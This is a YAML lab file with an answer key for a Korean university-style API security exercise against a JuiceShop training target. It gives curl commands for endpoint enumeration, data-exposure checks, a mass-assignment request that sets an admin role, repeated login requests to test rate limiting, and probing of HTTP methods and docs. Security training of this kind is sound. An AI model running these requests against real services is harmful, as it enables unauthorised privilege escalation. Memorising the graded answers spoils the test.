lab_id: "web-vuln-nonai-week12"
title: "API 보안 취약점 실습"
version: "non-ai"
course: "web-vuln-nonai"
week: 12
description: "REST API의 인증 우회, 과도한 데이터 노출, Mass Assignment 등 OWASP API Top 10 취약점을 실습합니다."
difficulty: "hard"
duration_minutes: 120
objectives:
  - "API 보안 취약점 유형을 이해한다"
  - "인증 우회 및 과도한 데이터 노출을 실습한다"
  - "Mass Assignment 공격을 시도한다"
pass_threshold: 0.6
steps:
  - order: 1
    instruction: "JuiceShop(10.20.30.80:3000)의 API 엔드포인트를 열거하라. /api/ 경로 하위의 모든 리소스를 탐색하라."
    hint: "curl -s http://10.20.30.80:3000/api/ 로 시작하고, Products, Users, Feedbacks 등을 확인하세요."
    category: "recon"
    points: 8
    answer: "for ep in Products Users Feedbacks Challenges Recycles SecurityQuestions; do CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/api/$ep/ 2>/dev/null); echo \"$ep: $CODE\"; done"
    answer_detail: "API 열거는 보안 점검의 첫 단계입니다. 200이면 접근 가능, 401이면 인증 필요, 404면 미존재 엔드포인트입니다. 인증 없이 접근 가능한 엔드포인트는 정보 유출 위험이 있습니다."
    verify:
      type: "output_contains"
      expect: "200"
      field: "stdout"
  - order: 2
    instruction: "인증 없이 접근 가능한 API에서 과도한 데이터 노출(Excessive Data Exposure)을 확인하라. /api/Products/ 응답에서 불필요하게 노출되는 필드를 찾아라."
    hint: "curl -s http://10.20.30.80:3000/api/Products/ | python3 -m json.tool로 전체 구조를 확인하세요."
    category: "exploit"
    points: 10
    answer: "curl -s http://10.20.30.80:3000/api/Products/ 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',[{}])[0]; print('Exposed fields:', list(d.keys()))\" 2>/dev/null"
    answer_detail: "API가 내부 필드(deletedAt, createdAt, updatedAt)까지 노출하면 데이터베이스 구조가 드러납니다. 클라이언트에 필요한 필드만 반환해야 합니다 (DTO 패턴)."
    verify:
      type: "output_contains"
      expect: "Exposed fields"
      field: "stdout"
  - order: 3
    instruction: "사용자 등록 API에서 Mass Assignment를 시도하라. 등록 시 role 필드를 추가하여 관리자 권한을 획득하라."
    hint: "POST /api/Users/에 {\"email\":\"...\",\"password\":\"...\",\"role\":\"admin\"} 형태로 보내세요."
    category: "exploit"
    points: 15
    answer: "curl -s -X POST http://10.20.30.80:3000/api/Users/ -H 'Content-Type: application/json' -d '{\"email\":\"hacker@test.com\",\"password\":\"hack1234\",\"role\":\"admin\",\"isAdmin\":true}' 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin).get('data',{}); print(f'id={d.get(\\\"id\\\")}, email={d.get(\\\"email\\\")}, role={d.get(\\\"role\\\",\\\"?\\\")}, isAdmin={d.get(\\\"isAdmin\\\",\\\"?\\\")}')\" 2>/dev/null"
    answer_detail: "Mass Assignment는 클라이언트가 보낸 모든 필드를 서버가 맹목적으로 저장할 때 발생합니다. role=admin이 저장되면 권한 상승이 성공한 것입니다. ORM의 fillable/guarded 설정으로 방어합니다."
    verify:
      type: "output_contains"
      expect: "email="
      field: "stdout"
  - order: 4
    instruction: "API Rate Limiting이 적용되어 있는지 테스트하라. 같은 엔드포인트에 빠르게 50회 요청을 보내고 429(Too Many Requests) 응답이 오는지 확인하라."
    hint: "for 루프로 50회 반복 요청하고 응답 코드를 수집하세요."
    category: "exploit"
    points: 10
    answer: "for i in $(seq 1 50); do curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000/rest/user/login -X POST -H 'Content-Type: application/json' -d '{\"email\":\"a\",\"password\":\"b\"}' 2>/dev/null; done | sort | uniq -c | sort -rn"
    answer_detail: "Rate Limiting이 없으면 Brute Force, Credential Stuffing 공격이 가능합니다. 429 응답이 나오면 Rate Limiting이 적용된 것, 모두 401이면 미적용입니다."
    verify:
      type: "output_regex"
      expect: "401|429"
      field: "stdout"
  - order: 5
    instruction: "REST API의 HTTP 메소드를 테스트하라. /api/Products/1에 GET, PUT, DELETE를 보내고 각 응답을 확인하라."
    hint: "curl -X GET/PUT/DELETE로 각 메소드를 테스트하세요."
    category: "exploit"
    points: 10
    answer: "for m in GET PUT DELETE OPTIONS; do CODE=$(curl -s -o /dev/null -w '%{http_code}' -X $m http://10.20.30.80:3000/api/Products/1 -H 'Content-Type: application/json' 2>/dev/null); echo \"$m: $CODE\"; done"
    answer_detail: "API에서 불필요한 HTTP 메소드가 허용되면 데이터 수정/삭제가 가능합니다. GET만 허용해야 하는 엔드포인트에서 PUT/DELETE가 200을 반환하면 취약합니다."
    verify:
      type: "output_contains"
      expect: "GET:"
      field: "stdout"
  - order: 6
    instruction: "GraphQL 또는 Swagger 문서가 노출되는지 확인하라. /api-docs, /swagger.json, /graphql 경로를 탐색하라."
    hint: "curl로 각 경로에 접근하여 200 응답이 오는지 확인하세요."
    category: "recon"
    points: 8
    answer: "for path in /api-docs /swagger.json /graphql /.well-known/openapi.json /api-docs/swagger.json; do CODE=$(curl -s -o /dev/null -w '%{http_code}' http://10.20.30.80:3000$path 2>/dev/null); [ \"$CODE\" != \"404\" ] && echo \"$path: $CODE (EXPOSED)\"; done; echo 'Scan complete'"
    answer_detail: "API 문서(Swagger/OpenAPI)가 프로덕션에서 노출되면 모든 엔드포인트, 파라미터, 인증 방법이 공격자에게 노출됩니다. 프로덕션에서는 비활성화해야 합니다."
    verify:
      type: "output_contains"
      expect: "Scan complete"
      field: "stdout"
  - order: 7
    instruction: "API 보안 점검 결과를 /tmp/api_security_report.txt에 정리하라."
    hint: "발견된 API 취약점과 방어 권고를 포함하세요."
    category: "reporting"
    points: 8
    answer: "cat > /tmp/api_security_report.txt << 'EOF'\n=== API 보안 진단 보고서 ===\n대상: JuiceShop API (10.20.30.80:3000)\n\nOWASP API Top 10 점검:\n1. Broken Authentication: Rate Limiting 미적용\n2. Excessive Data Exposure: 내부 필드 노출\n3. Mass Assignment: role 필드 주입 가능성\n4. BOLA (IDOR): 타인 리소스 접근 가능\n5. Security Misconfiguration: 불필요 메소드 허용\n\n방어:\n- 입력 검증 + 출력 필터링\n- Rate Limiting + 인증 강화\n- API Gateway + WAF\nEOF\ncat /tmp/api_security_report.txt"
    answer_detail: "API 보안은 전통적 웹 보안과 다른 관점이 필요합니다. OWASP API Security Top 10은 BOLA, Broken Authentication, Excessive Data Exposure 등 API 특화 위협을 다룹니다."
    verify:
      type: "output_contains"
      expect: "API 보안 진단 보고서"
      field: "stdout"
